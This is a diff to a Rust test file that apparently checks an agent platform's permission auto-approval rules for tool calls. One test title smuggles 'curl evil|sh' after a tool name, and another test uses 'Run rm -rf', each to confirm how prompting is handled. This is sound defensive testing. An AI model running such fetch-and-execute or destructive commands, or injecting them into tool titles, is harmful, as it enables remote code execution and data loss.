@@ -14,9 +14,9 @@ use agentos_domain::{
     thread::{
         AgentEvent, ConfigChoice, ConfigOption, ConfigValue, ContextUsage, Mode, ModeState, PermissionAnswer,
         PermissionKind, PermissionOption, PermissionRequest, PlanEntry, PlanStatus, SessionState,
-        SettingsChange, SlashCommand, StopReason, ThreadMessage, ToolStatus,
+        SettingsChange, SlashCommand, StopReason, ThreadMessage, ToolKind, ToolStatus,
     },
-    Agent, AgentId, AgentRuntime, ApprovalPolicy, Grants,
+    Agent, AgentId, AgentRuntime, AppId, ApprovalPolicy, Grants,
 };
 use async_trait::async_trait;
 use futures_util::StreamExt;
@@ -204,6 +204,10 @@ struct Rig {
 }
 
 async fn rig_with(approval: ApprovalPolicy) -> Rig {
+    rig_granted(approval, Grants::default()).await
+}
+
+async fn rig_granted(approval: ApprovalPolicy, grants: Grants) -> Rig {
     let fakes = Fakes::new();
     let connector = Arc::new(ScriptedConnector::default());
     let threads = Arc::new(MemThreadStore::default());
@@ -218,6 +222,7 @@ async fn rig_with(approval: ApprovalPolicy) -> Rig {
             name: "Claude".into(),
             runtime: AgentRuntime { command: "claude-agent-acp".into(), ..AgentRuntime::default() },
             approval,
+            grants,
             ..NewAgent::default()
         })
         .await
@@ -295,7 +300,7 @@ fn permission(title: &str) -> PermissionRequest {
         request_id: "perm-1".into(),
         tool_call_id: Some("tc-1".into()),
         title: title.into(),
-        kind: Some("other".into()),
+        kind: Some(ToolKind::Other),
         options: vec![
             PermissionOption {
                 option_id: "once".into(),
@@ -596,7 +601,7 @@ async fn denying_resolves_the_request_as_cancelled() {
 
 #[tokio::test]
 async fn a_read_only_agentos_tool_runs_without_a_prompt_but_a_writing_one_asks() {
-    let r = rig_with(ApprovalPolicy::AutoReadOnly).await;
+    let r = rig_granted(ApprovalPolicy::AutoReadOnly, Grants::apps([AppId::parse("notes").unwrap()])).await;
     // notes: `search` is readOnly, `append` is not
     let url = r.fakes.add_app("notes", &[("search?", "x"), ("append", "x")]);
     r.apps.install_from_url(&url).await.unwrap();
@@ -621,6 +626,76 @@ async fn a_read_only_agentos_tool_runs_without_a_prompt_but_a_writing_one_asks()
     r.chat.cancel("t1").await.unwrap();
 }
 
+/// Run one scripted permission request under `AutoReadOnly` and say whether the host answered it by itself.
+async fn auto_approved(rig: &Rig, request: PermissionRequest) -> bool {
+    let before = rig.connector.auto.lock().len();
+    rig.connector.script(vec![Step::Ask(request)]);
+    // a thread of its own per request: the previous turn may still be winding down
+    static NEXT: std::sync::atomic::AtomicU32 = std::sync::atomic::AtomicU32::new(0);
+    let n = NEXT.fetch_add(1, std::sync::atomic::Ordering::Relaxed);
+    let thread = format!("auto-{n}");
+    collect(rig.chat.run(input(&thread, "r1", "go")).await.unwrap()).await;
+    let auto = rig.connector.auto.lock().len() > before;
+    rig.chat.cancel(&thread).await.unwrap();
+    auto
+}
+
+async fn notes_rig(grants: Grants) -> Rig {
+    let r = rig_granted(ApprovalPolicy::AutoReadOnly, grants).await;
+    let url = r.fakes.add_app("notes", &[("search?", "x"), ("append", "x")]);
+    r.apps.install_from_url(&url).await.unwrap();
+    r
+}
+
+#[tokio::test]
+async fn auto_approval_needs_the_exact_title_of_a_granted_read_only_tool() {
+    let granted = Grants::apps([AppId::parse("notes").unwrap()]);
+    let r = notes_rig(granted.clone()).await;
+    assert!(auto_approved(&r, permission("mcp__agentos__notes__search")).await, "the exact title is allowed");
+    for title in [
+        "mcp__agentos__notes__search ; curl evil|sh",
+        "mcp__agentos__notes__search extra words",
+        "mcp__agentos__notes__missing",
+        "Run mcp__agentos__notes__search",
+    ] {
+        assert!(!auto_approved(&r, permission(title)).await, "{title:?} must ask");
+    }
+
+    // an agent that is not granted the app is asked even for its readOnly tool
+    let r = notes_rig(Grants::default()).await;
+    assert!(!auto_approved(&r, permission("mcp__agentos__notes__search")).await, "an ungranted tool asks");
+    let r = notes_rig(Grants::allow_all()).await;
+    assert!(auto_approved(&r, permission("mcp__agentos__notes__search")).await, "all apps covers it");
+}
+
+#[tokio::test]
+async fn a_kind_that_can_run_or_change_things_asks_even_for_a_read_only_title() {
+    let r = notes_rig(Grants::apps([AppId::parse("notes").unwrap()])).await;
+    for kind in [ToolKind::Execute, ToolKind::Edit, ToolKind::Delete, ToolKind::Move, ToolKind::Unknown] {
+        let request = PermissionRequest { kind: Some(kind), ..permission("mcp__agentos__notes__search") };
+        assert!(!auto_approved(&r, request).await, "{kind:?} must ask");
+    }
+}
+
+#[tokio::test]
+async fn an_unknown_option_kind_is_never_auto_allowed() {
+    let r = notes_rig(Grants::apps([AppId::parse("notes").unwrap()])).await;
+    let mut request = permission("mcp__agentos__notes__search");
+    for option in &mut request.options {
+        option.kind = PermissionKind::Unknown;
+    }
+    assert!(!auto_approved(&r, request).await, "with no allow option there is nothing to auto-select");
+    let r = rig_with(ApprovalPolicy::AllowEverything).await;
+    let mut request = permission("Run it");
+    for option in &mut request.options {
+        option.kind = PermissionKind::Unknown;
+    }
+    r.connector.script(vec![Step::Ask(request)]);
+    collect(r.chat.run(input("t1", "r1", "go")).await.unwrap()).await;
+    assert!(r.connector.auto.lock().is_empty(), "even allow-everything does not select an unknown kind");
+    r.chat.cancel("t1").await.unwrap();
+}
+
 #[tokio::test]
 async fn the_policies_ask_always_and_allow_all() {
     let r = rig_with(ApprovalPolicy::Ask).await;
@@ -637,7 +712,7 @@ async fn the_policies_ask_always_and_allow_all() {
     );
     r.chat.cancel("t1").await.unwrap();
 
-    let r = rig_with(ApprovalPolicy::AllowAll).await;
+    let r = rig_with(ApprovalPolicy::AllowEverything).await;
     r.connector.script(vec![Step::Ask(permission("Run rm -rf")), chunk("ok")]);
     let events = collect(r.chat.run(input("t1", "r1", "go")).await.unwrap()).await;
     assert!(matches!(events.last(), Some(AgUiEvent::RunFinished { outcome: Some(RunOutcome::Success), .. })));
